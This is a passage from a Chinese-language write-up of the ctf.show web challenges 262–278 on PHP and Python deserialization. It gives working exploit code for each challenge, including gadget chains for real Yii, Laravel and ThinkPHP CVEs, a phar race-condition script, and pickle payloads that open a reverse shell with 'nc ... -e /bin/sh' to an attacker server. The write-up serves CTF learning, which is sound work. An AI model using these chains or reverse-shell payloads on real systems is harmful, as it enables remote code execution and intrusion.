$_GET[&#x27;t&#x27;];if(isset($f) &amp;&amp; isset($m) &amp;&amp; isset($t))&#123; $msg = new message($f,$m,$t); $umsg = str_replace(&#x27;fuck&#x27;, &#x27;loveU&#x27;, serialize($msg)); setcookie(&#x27;msg&#x27;,base64_encode($umsg)); echo &#x27;Your message has been sent&#x27;;&#125;highlight_file(__FILE__); 看注释发现 message.php 123456789101112131415161718192021222324252627282930313233&lt;?php/*# -*- coding: utf-8 -*-# @Author: h1xa# @Date: 2020-12-03 15:13:03# @Last Modified by: h1xa# @Last Modified time: 2020-12-03 15:17:17# @email: h1xa@ctfer.com# @link: https://ctfer.com*/highlight_file(__FILE__);include(&#x27;flag.php&#x27;);class message&#123; public $from; public $msg; public $to; public $token=&#x27;user&#x27;; public function __construct($f,$m,$t)&#123; $this-&gt;from = $f; $this-&gt;msg = $m; $this-&gt;to = $t; &#125;&#125;if(isset($_COOKIE[&#x27;msg&#x27;]))&#123; $msg = unserialize(base64_decode($_COOKIE[&#x27;msg&#x27;])); if($msg-&gt;token==&#x27;admin&#x27;)&#123; echo $flag; &#125;&#125; 第一种做法poc 1234567891011&lt;?phpclass message&#123; public $token=&#x27;admin&#x27;;&#125;$msg = new message();echo(base64_encode(serialize($msg)));?&gt; 第二种做法因有一个正则替换，注意是序列化后再替换，且替换每次内容长度增加1，假如输入 t=fuck&quot; 我们输入的 &quot; 刚刚好可以发前面闭合，也就是说，我们每输入一个 fuck，我们可控的内容就多出 1 个字符。 我们目的构造 $token=&quot;admin&quot; 序列化长这样 即 s:5:&quot;token&quot;;s:5:&quot;admin&quot;; 加上闭合 1&quot;;``s:5:&quot;token&quot;;s:5:&quot;admin&quot;;``&#125; 长度为 27 也就是我们需要输入 27 个 fuck poc 1/?f=6&amp;m=6&amp;t=fuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuck&quot;;s:5:&quot;token&quot;;s:5:&quot;admin&quot;;&#125; web263 session伪造PHP/7.3.11 session伪造 📎www.zip 通过 /www.zip 扫描到源码，这里目录扫描全是 200，建议使用可以看到返回包大小的扫描器，或者有 404 页面识别的扫描器，比如 dirmap 日常吐槽 fortify，咋啥也扫不出来 (x seay 发现 file_put_contents 输入可控 利用前提： 利用点是 session.serialize_handler 与 php.ini 的配置不同引起的反序列化，至于为什么不同，如果相同的也就没必要加上这句设置了（ini_set(&#39;session.serialize_handler&#39;, &#39;php&#39;);），毕竟是默认配置对吧 目标： file_put_contents 可控点在 inc/inc.php 在 User 类，可以通过反序列化触发 __destruct 思路： 首先访问两次首页，抓包可以看到Cookie limit 参数，构造 exp ，使得我们的反序列化数据写入 session 文件（通过 $_SESSION[&#39;limit&#39;]=base64_decode($_COOKIE[&#39;limit&#39;]); 写入，这是PHP session 机制，可参考 此链接） 因 inc/inc.php 存在 ini_set(&#39;session.serialize_handler&#39;, &#39;php&#39;); 和 session_start(); ，只要访问即会获取之前写入的 session 数据，然后 check.php 包含 inc/inc.php ，即会触发 User类 的 __destruct方法 ，从而把恶意数据通过 file_put_contents 写入名为 log-$this.username ，内容为 $this.password 的文件。 poc 123456789101112&lt;?phpclass User&#123; public $username = &#x27;tari.php&#x27;; public $password = &#x27;&lt;?php system(&quot;cat flag.php&quot;) ?&gt;&#x27;;&#125;$user = new User();echo(base64_encode(&#x27;|&#x27;.serialize($user)));?&gt; 这里加 &#39;|&#39; 是因为 session.serialize_handler 使用 php引擎 ，session 关联数组的 key 和 value 是通过 &#39;|&#39; 区分的， value 是需要被反序列化的部分。然后默认不是用 php 引擎，所以…. 所以写入是正常字符串，在 inc/inc.php 这读取语义又不一样了。 随便请求一下 check.php 注意是 log-tari.php ! web264 字符逃逸PHP/5.6.40 字符逃逸 123456789101112131415161718192021222324252627282930313233343536373839404142&lt;?php/*# -*- coding: utf-8 -*-# @Author: h1xa# @Date: 2020-12-03 02:37:19# @Last Modified by: h1xa# @Last Modified time: 2020-12-03 16:05:38# @message.php# @email: h1xa@ctfer.com# @link: https://ctfer.com*/error_reporting(0);session_start();class message&#123; public $from; public $msg; public $to; public $token=&#x27;user&#x27;; public function __construct($f,$m,$t)&#123; $this-&gt;from = $f; $this-&gt;msg = $m; $this-&gt;to = $t; &#125;&#125;$f = $_GET[&#x27;f&#x27;];$m = $_GET[&#x27;m&#x27;];$t = $_GET[&#x27;t&#x27;];if(isset($f) &amp;&amp; isset($m) &amp;&amp; isset($t))&#123; $msg = new message($f,$m,$t); $umsg = str_replace(&#x27;fuck&#x27;, &#x27;loveU&#x27;, serialize($msg)); $_SESSION[&#x27;msg&#x27;]=base64_encode($umsg); echo &#x27;Your message has been sent&#x27;;&#125;highlight_file(__FILE__); 看注释发现 message.php 12345678910111213141516171819202122232425262728293031323334&lt;?php/*# -*- coding: utf-8 -*-# @Author: h1xa# @Date: 2020-12-03 15:13:03# @Last Modified by: h1xa# @Last Modified time: 2020-12-03 15:17:17# @email: h1xa@ctfer.com# @link: https://ctfer.com*/session_start();highlight_file(__FILE__);include(&#x27;flag.php&#x27;);class message&#123; public $from; public $msg; public $to; public $token=&#x27;user&#x27;; public function __construct($f,$m,$t)&#123; $this-&gt;from = $f; $this-&gt;msg = $m; $this-&gt;to = $t; &#125;&#125;if(isset($_COOKIE[&#x27;msg&#x27;]))&#123; $msg = unserialize(base64_decode($_SESSION[&#x27;msg&#x27;])); if($msg-&gt;token==&#x27;admin&#x27;)&#123; echo $flag; &#125;&#125; 看注释发现 message.php 12345678910111213141516171819202122232425262728293031323334&lt;?php/*# -*- coding: utf-8 -*-# @Author: h1xa# @Date: 2020-12-03 15:13:03# @Last Modified by: h1xa# @Last Modified time: 2020-12-03 15:17:17# @email: h1xa@ctfer.com# @link: https://ctfer.com*/session_start();highlight_file(__FILE__);include(&#x27;flag.php&#x27;);class message&#123; public $from; public $msg; public $to; public $token=&#x27;user&#x27;; public function __construct($f,$m,$t)&#123; $this-&gt;from = $f; $this-&gt;msg = $m; $this-&gt;to = $t; &#125;&#125;if(isset($_COOKIE[&#x27;msg&#x27;]))&#123; $msg = unserialize(base64_decode($_SESSION[&#x27;msg&#x27;])); if($msg-&gt;token==&#x27;admin&#x27;)&#123; echo $flag; &#125;&#125; 一开始没看出和 web262 有啥区别，仔细看了一下发现，反序列化时使用了 session 而不是直接通过 Cookie 接收 做法和 web262中第二种做法一样，虽然不是通过 Cookie 接收，也别忘了了 Cookie 的 msg 字段附加个值，不然不满足 1if(isset($_COOKIE[&#x27;msg&#x27;]))&#123; 先请求 index.php （这里 poc 不明白怎么构造看一下 web262 第二种做法） 因为 PHP 的 session 是通过 Cookie 里的 PHPSESSID 获取的（不清除参考 web263 session 伪造），所以要记录下来，然后在 message.php 里带上。 然后请求一下 message.php , 别忘了 Cookie 部分 web265 变量引用PHP/5.6.40 变量引用 1234567891011121314151617181920212223242526272829303132333435&lt;?php/*# -*- coding: utf-8 -*-# @Author: h1xa# @Date: 2020-12-04 23:52:24# @Last Modified by: h1xa# @Last Modified time: 2020-12-05 00:17:08# @email: h1xa@ctfer.com# @link: https://ctfer.com*/error_reporting(0);include(&#x27;flag.php&#x27;);highlight_file(__FILE__);class ctfshowAdmin&#123; public $token; public $password; public function __construct($t,$p)&#123; $this-&gt;token=$t; $this-&gt;password = $p; &#125; public function login()&#123; return $this-&gt;token===$this-&gt;password; &#125;&#125;$ctfshow = unserialize($_GET[&#x27;ctfshow&#x27;]);$ctfshow-&gt;token=md5(mt_rand());if($ctfshow-&gt;login())&#123; echo $flag;&#125; token 会变，让 password 成为 token 的引用就好了 poc 12345678910111213&lt;?phpclass ctfshowAdmin&#123; public $token; public $password;&#125;$admin = new ctfshowAdmin();$admin-&gt;password = &amp;$admin-&gt;token;echo(urlencode(serialize($admin)));?&gt; web266 类和方法不区分大小写PHP/7.3.11 PHP特性 类和方法不区分大小写 1234567891011121314151617181920212223242526272829303132333435363738394041&lt;?php/*# -*- coding: utf-8 -*-# @Author: h1xa# @Date: 2020-12-04 23:52:24# @Last Modified by: h1xa# @Last Modified time: 2020-12-05 00:17:08# @email: h1xa@ctfer.com# @link: https://ctfer.com*/highlight_file(__FILE__);include(&#x27;flag.php&#x27;);$cs = file_get_contents(&#x27;php://input&#x27;);class ctfshow&#123; public $username=&#x27;xxxxxx&#x27;; public $password=&#x27;xxxxxx&#x27;; public function __construct($u,$p)&#123; $this-&gt;username=$u; $this-&gt;password=$p; &#125; public function login()&#123; return $this-&gt;username===$this-&gt;password; &#125; public function __toString()&#123; return $this-&gt;username; &#125; public function __destruct()&#123; global $flag; echo $flag; &#125;&#125;$ctfshowo=@unserialize($cs);if(preg_match(&#x27;/ctfshow/&#x27;, $cs))&#123; throw new Exception(&quot;Error $ctfshowo&quot;,1);&#125; 拦截点：序列化数据不能包括 ctfshow， PHP特性：函数名和类名不区分大小写，变量名区分，例如 poc 12345678910&lt;?phpclass Ctfshow&#123;&#125;$user = new Ctfshow();echo(serialize($user));?&gt; web267 Yii 框架 CVEPHP/7.3.11 框架审计 CVE-2020-15148 Yii登录前 弱密码 admin/admin 登录 about 页面有个 &lt;!--?view-source --&gt; 提示 可以通过 index.php?r=site%2Fabout&amp;view-source 查看提示 这是 Yii 的路由规则，传送门 ，咋知道的 Yii？通过 burp 抓包记录看到很多 yii.js php 搜了下 （ 框架反序列化漏洞，网上应该可以搜到，一个不错的复现和挖掘文章，传送门 有空会（咕咕预订…）额外写文章复现 （ poc 12345678910111213141516171819202122232425262728293031323334353637383940&lt;?phpnamespace yii\\rest&#123; class CreateAction&#123; public $checkAccess; public $id; public function __construct()&#123; $this-&gt;checkAccess = &#x27;exec&#x27;; $this-&gt;id = &#x27;cp /fla* tari.txt&#x27;; &#125; &#125;&#125;namespace Faker&#123; use yii\\rest\\CreateAction; class Generator&#123; protected $formatters; public function __construct()&#123; $this-&gt;formatters[&#x27;close&#x27;] = [new CreateAction, &#x27;run&#x27;]; &#125; &#125;&#125;namespace yii\\db&#123; use Faker\\Generator; class BatchQueryResult&#123; private $_dataReader; public function __construct()&#123; $this-&gt;_dataReader = new Generator; &#125; &#125;&#125;namespace&#123; echo base64_encode(serialize(new yii\\db\\BatchQueryResult));&#125; web268 Yii 框架 CVE 补丁绕过 1PHP/7.3.11 框架审计 CVE-2020-15148 Yii登录前 补丁绕过 思路类似 web267，估计是打过补丁版本 有空会（咕咕预订…）额外写文章复现 （ poc1 1234567891011121314151617181920212223242526272829303132333435363738394041&lt;?phpnamespace yii\\rest&#123; class CreateAction&#123; public $checkAccess; public $id; public function __construct()&#123; $this-&gt;checkAccess = &#x27;exec&#x27;; $this-&gt;id = &#x27;cp /fla* tari.txt&#x27;; &#125; &#125;&#125;namespace Faker&#123; use yii\\rest\\CreateAction; class Generator&#123; protected $formatters; public function __construct()&#123; // 这里需要改为isRunning $this-&gt;formatters[&#x27;isRunning&#x27;] = [new CreateAction(), &#x27;run&#x27;]; &#125; &#125;&#125;// poc1namespace Codeception\\Extension&#123; use Faker\\Generator; class RunProcess&#123; private $processes; public function __construct() &#123; $this-&gt;processes = [new Generator()]; &#125; &#125;&#125;namespace&#123; echo base64_encode(serialize(new Codeception\\Extension\\RunProcess()));&#125;?&gt; web269 Yii 框架 CVE 补丁绕过 2PHP/7.3.11 框架审计 CVE-2020-15148 Yii登录前 补丁绕过 思路类似 web267，估计是打过补丁版本 有空会（咕咕预订…）额外写文章复现 （ poc2 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354&lt;?phpnamespace yii\\rest&#123; class CreateAction&#123; public $checkAccess; public $id; public function __construct()&#123; $this-&gt;checkAccess = &#x27;exec&#x27;; $this-&gt;id = &#x27;cp /fla* tari.txt&#x27;; &#125; &#125;&#125;namespace Faker&#123; use yii\\rest\\CreateAction; class Generator&#123; protected $formatters; public function __construct()&#123; $this-&gt;formatters[&#x27;render&#x27;] = [new CreateAction(), &#x27;run&#x27;]; &#125; &#125;&#125;namespace phpDocumentor\\Reflection\\DocBlock\\Tags&#123; use Faker\\Generator; class See&#123; protected $description; public function __construct() &#123; $this-&gt;description = new Generator(); &#125; &#125;&#125;namespace&#123; use phpDocumentor\\Reflection\\DocBlock\\Tags\\See; class Swift_KeyCache_DiskKeyCache&#123; private $keys = []; private $path; public function __construct() &#123; $this-&gt;path = new See; $this-&gt;keys = array( // 有就行 &quot;suiyi&quot;=&gt;array(&quot;suiyi&quot;=&gt;&quot;suiyi&quot;) ); &#125; &#125; echo base64_encode(serialize(new Swift_KeyCache_DiskKeyCache()));&#125;?&gt; web270 Yii 框架 CVE 补丁绕过 3PHP/7.3.11 框架审计 CVE-2020-15148 Yii登录前 补丁绕过 思路类似 web267，估计是打过补丁版本 有空会（咕咕预订…）额外写文章复现 （ poc3 12345678910111213141516171819202122232425262728293031323334353637383940414243&lt;?phpnamespace yii\\rest &#123; class Action &#123; public $checkAccess; &#125; class IndexAction &#123; public function __construct($func, $param) &#123; $this-&gt;checkAccess = $func; $this-&gt;id = $param; &#125; &#125;&#125;namespace yii\\web &#123; abstract class MultiFieldSession &#123; public $writeCallback; &#125; class DbSession extends MultiFieldSession &#123; public function __construct($func, $param) &#123; $this-&gt;writeCallback = [new \\yii\\rest\\IndexAction($func, $param), &quot;run&quot;]; &#125; &#125;&#125;namespace yii\\db &#123; use yii\\base\\BaseObject; class BatchQueryResult &#123; private $_dataReader; public function __construct($func, $param) &#123; $this-&gt;_dataReader = new \\yii\\web\\DbSession($func, $param); &#125; &#125;&#125;namespace &#123; $exp = new \\yii\\db\\BatchQueryResult(&#x27;exec&#x27;, &#x27;cp /fla* tari.txt&#x27;); echo(base64_encode(serialize($exp)));&#125; web271 Laravel 5.7 框架 CVEPHP/7.1.26 框架审计 CVE-2019-9081 Laravel 5.7登录前 源码 可参考文章 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859&lt;?php/** * Laravel - A PHP Framework For Web Artisans * * @package Laravel * @author Taylor Otwell &lt;taylor@laravel.com&gt; */define(&#x27;LARAVEL_START&#x27;, microtime(true));/*|--------------------------------------------------------------------------| Register The Auto Loader|--------------------------------------------------------------------------|| Composer provides a convenient, automatically generated class loader for| our application. We just need to utilize it! We&#x27;ll simply require it| into the script here so that we don&#x27;t have to worry about manual| loading any of our classes later on. It feels great to relax.|*/require __DIR__ . &#x27;/../vendor/autoload.php&#x27;;/*|--------------------------------------------------------------------------| Turn On The Lights|--------------------------------------------------------------------------|| We need to illuminate PHP development, so let us turn on the lights.| This bootstraps the framework and gets it ready for use, then it| will load up this application so that we can run it and send| the responses back to the browser and delight our users.|*/$app = require_once __DIR__ . &#x27;/../bootstrap/app.php&#x27;;/*|--------------------------------------------------------------------------| Run The Application|--------------------------------------------------------------------------|| Once we have the application, we can handle the incoming request| through the kernel, and send the associated response back to| the client&#x27;s browser allowing them to enjoy the creative| and wonderful application we have prepared for them.|*/$kernel = $app-&gt;make(Illuminate\\Contracts\\Http\\Kernel::class);$response = $kernel-&gt;handle( $request = Illuminate\\Http\\Request::capture());@unserialize($_POST[&#x27;data&#x27;]);highlight_file(__FILE__);$kernel-&gt;terminate($request, $response); poc 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455&lt;?phpnamespace Illuminate\\Foundation\\Testing &#123; class PendingCommand &#123; public $test; protected $app; protected $command; protected $parameters; public function __construct($test, $app, $command, $parameters) &#123; $this-&gt;test = $test; //一个实例化的类 Illuminate\\Auth\\GenericUser $this-&gt;app = $app; //一个实例化的类 Illuminate\\Foundation\\Application $this-&gt;command = $command; //要执行的php函数 system $this-&gt;parameters = $parameters; //要执行的php函数的参数 array(&#x27;id&#x27;) &#125; &#125;&#125;namespace Faker &#123; class DefaultGenerator &#123; protected $default; public function __construct($default = null) &#123; $this-&gt;default = $default; &#125; &#125;&#125;namespace Illuminate\\Foundation &#123; class Application &#123; protected $instances = []; public function __construct($instances = []) &#123; $this-&gt;instances[&#x27;Illuminate\\Contracts\\Console\\Kernel&#x27;] = $instances; &#125; &#125;&#125;namespace &#123; $defaultgenerator = new Faker\\DefaultGenerator(array(&quot;hello&quot; =&gt; &quot;world&quot;)); $app = new Illuminate\\Foundation\\Application(); $application = new Illuminate\\Foundation\\Application($app); $pendingcommand = new Illuminate\\Foundation\\Testing\\PendingCommand($defaultgenerator, $application, &#x27;system&#x27;, array(&#x27;cat /flag&#x27;)); echo urlencode(serialize($pendingcommand));&#125; 因代码里是通过 POST 的 data 接收，所以这里是用 data POST 过去 web272 Laravel 5.8 框架 CVEPHP/7.1.26 框架审计 Laravel 5.8登录前 可参考文章 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859&lt;?php/** * Laravel - A PHP Framework For Web Artisans * * @package Laravel * @author Taylor Otwell &lt;taylor@laravel.com&gt; */define(&#x27;LARAVEL_START&#x27;, microtime(true));/*|--------------------------------------------------------------------------| Register The Auto Loader|--------------------------------------------------------------------------|| Composer provides a convenient, automatically generated class loader for| our application. We just need to utilize it! We&#x27;ll simply require it| into the script here so that we don&#x27;t have to worry about manual| loading any of our classes later on. It feels great to relax.|*/require __DIR__ . &#x27;/../vendor/autoload.php&#x27;;/*|--------------------------------------------------------------------------| Turn On The Lights|--------------------------------------------------------------------------|| We need to illuminate PHP development, so let us turn on the lights.| This bootstraps the framework and gets it ready for use, then it| will load up this application so that we can run it and send| the responses back to the browser and delight our users.|*/$app = require_once __DIR__ . &#x27;/../bootstrap/app.php&#x27;;/*|--------------------------------------------------------------------------| Run The Application|--------------------------------------------------------------------------|| Once we have the application, we can handle the incoming request| through the kernel, and send the associated response back to| the client&#x27;s browser allowing them to enjoy the creative| and wonderful application we have prepared for them.|*/$kernel = $app-&gt;make(Illuminate\\Contracts\\Http\\Kernel::class);$response = $kernel-&gt;handle( $request = Illuminate\\Http\\Request::capture());@unserialize($_POST[&#x27;data&#x27;]);highlight_file(__FILE__);$kernel-&gt;terminate($request, $response); 有空会（咕咕预订…）额外写文章复现 （ poc 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162&lt;?phpnamespace PhpParser\\Node\\Scalar\\MagicConst&#123; class Line &#123;&#125;&#125;namespace Mockery\\Generator&#123; class MockDefinition &#123; protected $config; protected $code; public function __construct($config, $code) &#123; $this-&gt;config = $config; $this-&gt;code = $code; &#125; &#125;&#125;namespace Mockery\\Loader&#123; class EvalLoader&#123;&#125;&#125;namespace Illuminate\\Bus&#123; class Dispatcher &#123; protected $queueResolver; public function __construct($queueResolver) &#123; $this-&gt;queueResolver = $queueResolver; &#125; &#125;&#125;namespace Illuminate\\Foundation\\Console&#123; class QueuedCommand &#123; public $connection; public function __construct($connection) &#123; $this-&gt;connection = $connection; &#125; &#125;&#125;namespace Illuminate\\Broadcasting&#123; class PendingBroadcast &#123; protected $events; protected $event; public function __construct($events, $event) &#123; $this-&gt;events = $events; $this-&gt;event = $event; &#125; &#125;&#125;namespace&#123; $line = new PhpParser\\Node\\Scalar\\MagicConst\\Line(); $mockdefinition = new Mockery\\Generator\\MockDefinition($line,&quot;&lt;?php system(&#x27;cat /f*&#x27;);exit;?&gt;&quot;); $evalloader = new Mockery\\Loader\\EvalLoader(); $dispatcher = new Illuminate\\Bus\\Dispatcher(array($evalloader,&#x27;load&#x27;)); $queuedcommand = new Illuminate\\Foundation\\Console\\QueuedCommand($mockdefinition); $pendingbroadcast = new Illuminate\\Broadcasting\\PendingBroadcast($dispatcher,$queuedcommand); echo urlencode(serialize($pendingbroadcast));&#125;?&gt; 其实还有挺多链的 https://www.anquanke.com/post/id/189718 web273 和web273一样PHP/7.1.32框架审计Laravel 5.8登录前 PHP/7.1.32 框架审计 Laravel 5.8登录前 emm，说实话除了PHP版本细微差别，还不知道有啥区别，竟然 poc 一毛一样 有空会（咕咕预订…）额外写文章复现 （ web274 thinkphp5.1nginx/1.16.1 PHP/7.3.11 框架审计 thinkphp5.1 thinkphp 5.1反序列化漏洞 参考文章：https://xz.aliyun.com/t/6619 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849&lt;?phpnamespace think;abstract class Model&#123; protected $append = []; private $data = []; function __construct()&#123; $this-&gt;append = [&quot;lin&quot;=&gt;[&quot;calc.exe&quot;,&quot;calc&quot;]]; $this-&gt;data = [&quot;lin&quot;=&gt;new Request()]; &#125;&#125;class Request&#123; protected $hook = []; protected $filter = &quot;system&quot;; protected $config = [ // 表单ajax伪装变量 &#x27;var_ajax&#x27; =&gt; &#x27;_ajax&#x27;, ]; function __construct()&#123; $this-&gt;filter = &quot;system&quot;; $this-&gt;config = [&quot;var_ajax&quot;=&gt;&#x27;lin&#x27;]; $this-&gt;hook = [&quot;visible&quot;=&gt;[$this,&quot;isAjax&quot;]]; &#125;&#125;namespace think\\process\\pipes;use think\\model\\concern\\Conversion;use think\\model\\Pivot;class Windows&#123; private $files = []; public function __construct() &#123; $this-&gt;files=[new Pivot()]; &#125;&#125;namespace think\\model;use think\\Model;class Pivot extends Model&#123;&#125;use think\\process\\pipes\\Windows;echo base64_encode(serialize(new Windows()));?&gt; 数据接收方式 有空会（咕咕预订…）额外写文章复现 （ poc 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849&lt;?phpnamespace think;abstract class Model&#123; protected $append = []; private $data = []; function __construct()&#123; $this-&gt;append = [&quot;lin&quot;=&gt;[&quot;calc.exe&quot;,&quot;calc&quot;]]; $this-&gt;data = [&quot;lin&quot;=&gt;new Request()]; &#125;&#125;class Request&#123; protected $hook = []; protected $filter = &quot;system&quot;; protected $config = [ // 表单ajax伪装变量 &#x27;var_ajax&#x27; =&gt; &#x27;_ajax&#x27;, ]; function __construct()&#123; $this-&gt;filter = &quot;system&quot;; $this-&gt;config = [&quot;var_ajax&quot;=&gt;&#x27;lin&#x27;]; $this-&gt;hook = [&quot;visible&quot;=&gt;[$this,&quot;isAjax&quot;]]; &#125;&#125;namespace think\\process\\pipes;use think\\model\\concern\\Conversion;use think\\model\\Pivot;class Windows&#123; private $files = []; public function __construct() &#123; $this-&gt;files=[new Pivot()]; &#125;&#125;namespace think\\model;use think\\Model;class Pivot extends Model&#123;&#125;use think\\process\\pipes\\Windows;echo base64_encode(serialize(new Windows()));?&gt; web275 命令执行拼接PHP/7.3.11 nginx/1.16.1 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556&lt;?php/*# -*- coding: utf-8 -*-# @Author: h1xa# @Date: 2020-12-08 19:13:36# @Last Modified by: h1xa# @Last Modified time: 2020-12-08 20:08:07# @email: h1xa@ctfer.com# @link: https://ctfer.com*/highlight_file(__FILE__);class filter&#123; public $filename; public $filecontent; public $evilfile=false; public function __construct($f,$fn)&#123; $this-&gt;filename=$f; $this-&gt;filecontent=$fn; &#125; public function checkevil()&#123; if(preg_match(&#x27;/php|\\.\\./i&#x27;, $this-&gt;filename))&#123; $this-&gt;evilfile=true; &#125; if(preg_match(&#x27;/flag/i&#x27;, $this-&gt;filecontent))&#123; $this-&gt;evilfile=true; &#125; return $this-&gt;evilfile; &#125; public function __destruct()&#123; if($this-&gt;evilfile)&#123; system(&#x27;rm &#x27;.$this-&gt;filename); &#125; &#125;&#125;if(isset($_GET[&#x27;fn&#x27;]))&#123; $content = file_get_contents(&#x27;php://input&#x27;); $f = new filter($_GET[&#x27;fn&#x27;],$content); if($f-&gt;checkevil()===false)&#123; file_put_contents($_GET[&#x27;fn&#x27;], $content); copy($_GET[&#x27;fn&#x27;],md5(mt_rand()).&#x27;.txt&#x27;); unlink($_SERVER[&#x27;DOCUMENT_ROOT&#x27;].&#x27;/&#x27;.$_GET[&#x27;fn&#x27;]); echo &#x27;work done&#x27;; &#125; &#125;else&#123; echo &#x27;where is flag?&#x27;;&#125;where is flag? 分析： 看似花里胡哨，其实 __destruct 里的 system 可直接拼接，也就是设法让 $this-&gt;evilfile 置为 true ，然后拼接命令即可。 题外：第一眼看去这一读一写，长的这么想被我条件竞争的样子 （ web276 phar反序列化 条件竞争nginx/1.16.1 PHP/7.3.11 phar反序列化 条件竞争 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657&lt;?php/*# -*- coding: utf-8 -*-# @Author: h1xa# @Date: 2020-12-08 19:13:36# @Last Modified by: h1xa# @Last Modified time: 2020-12-08 20:08:07# @email: h1xa@ctfer.com# @link: https://ctfer.com*/highlight_file(__FILE__);class filter&#123; public $filename; public $filecontent; public $evilfile=false; public $admin = false; public function __construct($f,$fn)&#123; $this-&gt;filename=$f; $this-&gt;filecontent=$fn; &#125; public function checkevil()&#123; if(preg_match(&#x27;/php|\\.\\./i&#x27;, $this-&gt;filename))&#123; $this-&gt;evilfile=true; &#125; if(preg_match(&#x27;/flag/i&#x27;, $this-&gt;filecontent))&#123; $this-&gt;evilfile=true; &#125; return $this-&gt;evilfile; &#125; public function __destruct()&#123; if($this-&gt;evilfile &amp;&amp; $this-&gt;admin)&#123; system(&#x27;rm &#x27;.$this-&gt;filename); &#125; &#125;&#125;if(isset($_GET[&#x27;fn&#x27;]))&#123; $content = file_get_contents(&#x27;php://input&#x27;); $f = new filter($_GET[&#x27;fn&#x27;],$content); if($f-&gt;checkevil()===false)&#123; file_put_contents($_GET[&#x27;fn&#x27;], $content); copy($_GET[&#x27;fn&#x27;],md5(mt_rand()).&#x27;.txt&#x27;); unlink($_SERVER[&#x27;DOCUMENT_ROOT&#x27;].&#x27;/&#x27;.$_GET[&#x27;fn&#x27;]); echo &#x27;work done&#x27;; &#125; &#125;else&#123; echo &#x27;where is flag?&#x27;;&#125;where is flag? 分析： emm，在上题基础上新增了个判断 $this-&gt;admin 然后想着，构造一下序列化不就行了嘛，然后发现没有反序列化函数。。 看了下发现可以通过 file_put_contents 写 phar文件，然后题目中 file_put_contents 第一个参数可控，那么我们可以使用 phar:// 协议，通过 $content 传入 phar 数据，这样在 PHP 通过 phar:// 协议解析数据时，会将 meta-data 部分进行反序列化。 不过题目会删除文件，所以需要在删除文件前执行文件进行以上操作，因此要用到条件竞争，即生成了 phar 文件，在极短时间内文件是存在的，因为执行到 unlink 函数前还有一个 copy 文件操作，磁盘 io 是需要一定时间的。只要我们不断在写入 phar 文件，那么这个文件就可以断断续续访问到~ poc phar构造如下，会在当前目录生成 evil.phar 文件 123456789101112131415161718192021222324252627&lt;?phpclass filter &#123; public $filename = &#x27;;cat fl*&#x27;; public $evilfile = true; public $admin = true;&#125;// 后缀必须为phar$phar = new Phar(&quot;evil.phar&quot;);$phar-&gt;startBuffering();// 设置 stubb, 增加 gif 文件头$phar-&gt;setStub(&quot;&lt;?php __HALT_COMPILER(); ?&gt;&quot;);$o = new filter();/** * 将自定义的 meta-data 存入 manifest * 这个函数需要在php.ini中修改 phar.readonly 为 Off * 否则的话会抛出 * creating archive &quot;***.phar&quot; disabled by the php.ini setting phar.readonly * 异常. */$phar-&gt;setMetadata($o);// 添加需压缩的文件$phar-&gt;addFromString(&quot;test.txt&quot;, &quot;test&quot;);$phar-&gt;stopBuffering();?&gt; 条件竞争，py3脚本 1234567891011121314151617181920212223242526272829import base64import requestsimport threadingflag = Falseurl = &#x27;http://0f5a5b64-ef6b-4317-b093-3f2fc62f1df9.challenge.ctf.show:8080/&#x27;data = open(&#x27;./evil.phar&#x27;, &#x27;rb&#x27;).read()pre_resp = requests.get(url)if pre_resp.status_code != 200: print(url + &#x27;\\n链接好像挂了....&#x27;) exit(1)def upload(): requests.post(url+&quot;?fn=evil.phar&quot;, data=data)def read(): global flag r = requests.post(url+&quot;?fn=phar://evil.phar/&quot;, data=&quot;&quot;) if &quot;ctfshow&#123;&quot; in r.text and flag is False: print(base64.b64encode(r.text.encode())) flag = Truewhile flag is False: a = threading.Thread(target=upload) b = threading.Thread(target=read) a.start() b.start() base64解码一下即可 题外 除了 file_put_contents 外，会把 phar 反序列化的函数还有： 受影响的函数列表 filename filectime (获取文件的inode更改时间) file_exists file_get_contents file_put_contents file filegroup (获取文件的组名) fopen fileinode （获取文件inode） filemtime （获取文件的修改时间） fileowner fileperms （获取文件权限） is_dir is_executable is_file is_link （判断文件名是否为符号链接） is_readable is_writable is_writeable parse_ini_file （解析配置文件） copy unlink stat （获取文件相关信息） readfile （输入文件内容） 表格参考自：https://v0w.top/2020/03/12/phar-unsearise/ web277 python 反序列化Werkzeug/1.0.1 Python/3.7.9 pickle 反序列化 Python反序列化，之前有过一些研究，晚点把Python反序列化基础链接更新上来~ 尝试了很多，发现是无回显的，需要反弹shell poc 123456789101112131415161718import base64import pickleimport requestsclass Exp(): def __reduce__(self): return(__import__(&quot;os&quot;).system, (&#x27;nc 服务器ip 服务器端口 -e /bin/sh&#x27;,))exp = Exp()s = pickle.dumps(exp)s_base64 = base64.b64encode(s)url = &#x27;http://7a111fcd-ce76-4dde-9c49-5aec7f2bd40f.challenge.ctf.show:8080/backdoor&#x27;params=&#123; &#x27;data&#x27;: s_base64&#125;requests.get(url, params) 先在服务器上监听 1nc -lvvp 7779 运行脚本 1python3 web277.py 回到服务器上 cat 一下即可 web278 python 反序列化 简单绕过Werkzeug/1.0.1 Python/3.7.9 pickle 反序列化 和 web277 差不多，只不过过滤了 system，换个函数即可 poc 123456789101112131415161718import base64import pickleimport requestsclass Exp(): def __reduce__(self): return(__import__(&quot;os&quot;).popen, (&#x27;nc 服务器ip 服务器端口 -e /bin/sh&#x27;,))exp = Exp()s = pickle.dumps(exp)s_base64 = base64.b64encode(s)url = &#x27;http://e281b968-e161-414c-bd80-c7a79045351e.challenge.ctf.show:8080/backdoor&#x27;params=&#123; &#x27;data&#x27;: s_base64&#125;requests.get(url, params) 一些参考的题解 https://blog.csdn.net/rfrder/article/details/113808539 (目标wp，框架题也有自己分析，膜拜！) https://blog.csdn.net/miuzzx/article/details/110558192 